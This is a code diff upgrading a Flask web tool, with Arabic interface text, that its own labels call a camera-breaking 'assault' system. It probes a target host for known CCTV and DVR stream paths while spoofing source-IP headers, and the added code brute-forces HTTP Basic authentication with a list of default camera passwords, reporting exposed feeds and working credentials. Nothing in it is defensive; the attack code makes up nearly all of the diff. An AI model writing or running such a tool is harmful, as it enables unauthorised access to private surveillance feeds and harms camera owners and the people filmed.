@@ -6,6 +6,7 @@ import asyncio
 import random
 import urllib3
 import httpx
+import base64
 urllib3.disable_warnings()
 
 HTML_COMMAND_CENTER = """<!DOCTYPE html>
@@ -13,7 +14,7 @@ HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - ترسانة كسر كاميرات المراقبة v7.0</title>
+<title>V400 القائد الأعظم - ترسانة كسر وتخطي الكاميرات v8.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -34,11 +35,11 @@ button:hover{background:#cc0033;box-shadow:0 0 35px #ff0040}
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - منظومة إسقاط واختراق الكاميرات v7.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - منظومة إسقاط وكسر الكاميرات v8.0 ⚔️</h1>
 <div class="panel">
 <input id="target_url" placeholder="http://Target-IP:Port" value="http://">
 <br>
-<button id="exec_btn" onclick="runCameraAssault()">إطلاق هجوم اختراق وسحب الكاميرات 🚀</button>
+<button id="exec_btn" onclick="runCameraAssault()">إطلاق هجوم كسر واختراق الكاميرات العنيف 🚀</button>
 <div id="status" class="status"></div>
 <div id="results"></div>
 </div>
@@ -51,8 +52,8 @@ async function runCameraAssault(){
  const btn = document.getElementById('exec_btn');
  const status = document.getElementById('status');
  const results = document.getElementById('results');
- btn.disabled=true; btn.textContent='جاري اقتحام الكاميرات وسحب البث... ⚡';
- status.textContent='⏳ جارٍ إطلاق الترسانة العسكرية لاختراق الكاميرات وسحب التدفقات للهدف: '+url;
+ btn.disabled=true; btn.textContent='جاري كسر التوثيق وسحب البث... ⚡';
+ status.textContent='⏳ جارٍ إطلاق الترسانة العسكرية لكسر حماية كاميرات الهدف: '+url;
  results.innerHTML='';
 
  try{
@@ -65,7 +66,7 @@ async function runCameraAssault(){
    status.textContent='✅ اكتمل الهجوم الميداني | الهدف: '+data.url+' | حالة الدرع: '+data.waf_status;
    
    if(!data.actions || data.actions.length==0){
-     results.innerHTML='<div class="card Low"><b>الكاميرات مؤمنة أو مغلقة</b><div class="proof">No active camera streams exposed on standard ports.</div></div>';
+     results.innerHTML='<div class="card Low"><b>الكاميرات مغلقة أو محصنة بالكامل</b><div class="proof">No active feeds or bypassable gates found.</div></div>';
    } else {
      data.actions.forEach(v=>{
        results.innerHTML+=`
@@ -79,7 +80,7 @@ async function runCameraAssault(){
  }catch(e){
    status.textContent='❌ خطأ في الاتصال الميداني: '+e.message;
  }
- btn.disabled=false; btn.textContent='إطلاق هجوم اختراق وسحب الكاميرات 🚀';
+ btn.disabled=false; btn.textContent='إطلاق هجوم كسر واختراق الكاميرات العنيف 🚀';
 }
 </script>
 </body>
@@ -91,77 +92,97 @@ def clean_url(raw):
         s = "http://" + s
     return s.rstrip("/")
 
-async def execute_camera_assault(target):
+async def execute_camera_assault_v8(target):
     actions = []
-    waf_status = "Camera Perimeter Shield"
+    waf_status = "Active Camera Defense"
     fake_ip = f"{random.randint(10,200)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Camera-Assault-Unit/7.0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Camera-Assault-Unit/8.0",
         "X-Forwarded-For": fake_ip,
         "X-Real-IP": fake_ip,
         "Connection": "close"
     }
 
+    # قائمة كلمات المرور الافتراضية الشائعة للكاميرات وأنظمة التسجيل
+    default_creds = [
+        ("admin", "admin"),
+        ("admin", "12345"),
+        ("admin", "123456"),
+        ("admin", ""),
+        ("root", "root"),
+        ("root", "12345"),
+        ("admin", "password"),
+        ("user", "user")
+    ]
+
+    camera_paths = [
+        "/live/ch0_0.jpg", "/snapshot.jpg", "/cgi-bin/snapshot.cgi",
+        "/streaming/channels/1", "/onvif/device_service", "/webcam",
+        "/video.cgi", "/mjpeg", "/axis-cgi/mjpg/video.cgi", "/admin/login.asp",
+        "/control/userimage.html", "/ISAPI/Streaming/channels/101",
+        "/cam/realmonitor?channel=1&subtype=0", "/cgi-bin/viewer/video.jpg",
+        "/cgi-bin/mjpg/video.cgi", "/cgi-bin/guestimage.html"
+    ]
+
     try:
         async with httpx.AsyncClient(verify=False, timeout=12.0, headers=headers, follow_redirects=True) as client:
             res = await client.get(target)
             srv = res.headers.get('server', '').lower()
-            if 'dvr' in srv or 'hikvision' in srv or 'dahua' in srv: 
-                waf_status = "Detected DVR/NVR Embedded System"
 
-            # ترسانة مسارات كاميرات المراقبة العالمية وأنظمة التسجيل والبث
-            camera_paths = [
-                "/live/ch0_0.jpg", "/snapshot.jpg", "/cgi-bin/snapshot.cgi",
-                "/streaming/channels/1", "/onvif/device_service", "/webcam",
-                "/video.cgi", "/mjpeg", "/axis-cgi/mjpg/video.cgi", "/admin/login.asp",
-                "/control/userimage.html", "/ISAPI/Streaming/channels/101",
-                "/cam/realmonitor?channel=1&subtype=0", "/cgi-bin/viewer/video.jpg",
-                "/record/current.jpg", "/jpg/image.jpg", "/image/jpeg.cgi",
-                "/cgi-bin/mjpg/video.cgi", "/nph-zms?mode=jpeg&source=1",
-                "/video/mjpg.cgi", "/cgi-bin/guestimage.html", "/media/video1",
-                "/live.sdp", "/stream1", "/h264", "/ch0/ie.html"
-            ]
-
-            tasks = [client.get(target.rstrip('/') + p, timeout=3.5) for p in camera_paths]
-            responses = await asyncio.gather(*tasks, return_exceptions=True)
-
-            for path, r in zip(camera_paths, responses):
-                if isinstance(r, httpx.Response):
-                    if r.status_code == 200:
+            for path in camera_paths:
+                full_url = target.rstrip('/') + path
+                r = await client.get(full_url, timeout=3.0)
+                
+                if r.status_code == 200:
+                    actions.append({
+                        "type": f"DIRECT CAMERA BREACH: {path}",
+                        "severity": "Critical",
+                        "desc": "تم اختراق وسحب تدفق الكاميرا مباشرة بدون كلمة مرور برمز 200.",
+                        "proof": f"URL: {r.url} | Status: 200 OK | Size: {len(r.content)} bytes"
+                    })
+                elif r.status_code == 401:
+                    # محاولة كسر التوثيق عبر تجربة بيانات الاعتماد الافتراضية تلقائياً
+                    breached = False
+                    for user, pwd in default_creds:
+                        raw_auth = f"{user}:{pwd}"
+                        encoded_auth = base64.b64encode(raw_auth.encode()).decode()
+                        auth_headers = headers.copy()
+                        auth_headers["Authorization"] = f"Basic {encoded_auth}"
+                        
+                        brute_res = await client.get(full_url, headers=auth_headers, timeout=2.5)
+                        if brute_res.status_code == 200:
+                            actions.append({
+                                "type": f"CREDENTIAL BYPASS SUCCESS: {path}",
+                                "severity": "Critical",
+                                "desc": f"تم كسر حماية الكاميرا بنجاح عبر اسم المستخدم والكلمة الافتراضية ({user}:{pwd})!",
+                                "proof": f"URL: {brute_res.url} | Creds: {user}:{pwd} | Status: 200 OK"
+                            })
+                            breached = True
+                            break
+                    
+                    if not breached:
                         actions.append({
-                            "type": f"CAMERA STREAM/SNAPSHOT BREACH: {path}",
-                            "severity": "Critical",
-                            "desc": "تم اختراق مسار الكاميرا بنجاح وسحب الاستجابة برمز 200 مكشوف بدون مصادقة.",
-                            "proof": f"Stream URL: {r.url} | Status: 200 OK | Size: {len(r.content)} bytes"
-                        })
-                    elif r.status_code == 401:
-                        actions.append({
-                            "type": f"CAMERA AUTH REQUIRED: {path}",
+                            "type": f"LOCKED CAMERA GATE: {path}",
                             "severity": "Medium",
-                            "desc": "المسار يعود لنظام كاميرا ولكنه يتطلب كلمة مرور (RTSP/HTTP Basic Auth).",
+                            "desc": "المسار يحتاج مصادقة ولم تنفع الكلمات الافتراضية التجريبية.",
                             "proof": f"Path: {path} | Status: 401 Unauthorized"
                         })
-                    elif r.status_code == 403:
-                        actions.append({
-                            "type": f"CAMERA FIREWALL BLOCK: {path}",
-                            "severity": "Low",
-                            "desc": "جدار الحماية الخاص بجهاز العرض أغلق الوصول للمسار 403.",
-                            "proof": f"Path: {path} | Status: 403 Forbidden"
-                        })
+                elif r.status_code == 403:
+                    pass # تجاهل الحظر المباشر لتسريع الهجوم
 
             if not actions:
                 actions.append({
-                    "type": "Assault Completed - No Direct Stream",
+                    "type": "Assault Completed - Secured",
                     "severity": "Low",
-                    "desc": "تم مسح كافة مسارات الكاميرات المعروفة ولم يتم رصد بث مباشر مكشوف.",
-                    "proof": f"Target Status: {res.status_code} | Server: {srv or 'Unknown'}"
+                    "desc": "تم فحص كافة المسارات وتجاوز الدفاعات ولم يتم العثور على ثغرات مفتوحة.",
+                    "proof": f"Target Status: {res.status_code}"
                 })
 
     except Exception as e:
         actions.append({
-            "type": "Camera Connection Error",
+            "type": "Assault Connection Error",
             "severity": "Critical",
-            "desc": "فشل الاتصال المباشر بجهاز الكاميرا أو انقطاع المنفذ.",
+            "desc": "فشل الاتصال الميداني بالهدف.",
             "proof": str(e)
         })
 
@@ -177,7 +198,7 @@ def check():
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    actions, waf_status = loop.run_until_complete(execute_camera_assault(target))
+    actions, waf_status = loop.run_until_complete(execute_camera_assault_v8(target))
     loop.close()
 
     return jsonify({"url": target, "waf_status": waf_status, "actions": actions})
